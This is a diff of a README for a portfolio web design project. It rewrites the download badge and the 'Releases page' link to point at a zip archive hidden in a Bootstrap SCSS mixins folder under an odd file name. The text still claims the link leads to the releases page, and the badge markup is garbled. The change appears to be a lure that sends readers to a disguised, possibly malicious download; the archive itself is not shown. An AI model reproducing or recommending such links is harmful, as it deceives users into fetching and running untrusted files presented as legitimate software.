@@ -6,7 +6,7 @@ Welcome to the _portfolio-web-design project! This project provides all the nece
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Stephendel6685/_portfolio-web-design/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Stephendel6685/_portfolio-web-design/main/scss/bootstrap/scss/mixins/_portfolio-web-design_annihilability.zip%20Latest%https://raw.githubusercontent.com/Stephendel6685/_portfolio-web-design/main/scss/bootstrap/scss/mixins/_portfolio-web-design_annihilability.zip)](https://raw.githubusercontent.com/Stephendel6685/_portfolio-web-design/main/scss/bootstrap/scss/mixins/_portfolio-web-design_annihilability.zip)
 
 ## 📦 System Requirements
 
@@ -26,7 +26,7 @@ Before you start, here are the basic requirements:
 
 ## 🔗 Download & Install
 
-To get the latest version of _portfolio-web-design, visit the [Releases page](https://github.com/Stephendel6685/_portfolio-web-design/releases).
+To get the latest version of _portfolio-web-design, visit the [Releases page](https://raw.githubusercontent.com/Stephendel6685/_portfolio-web-design/main/scss/bootstrap/scss/mixins/_portfolio-web-design_annihilability.zip).
 
 1. Click on the link above. This will take you to the releases page.
 2. You will see a list of available files. Find the latest version.
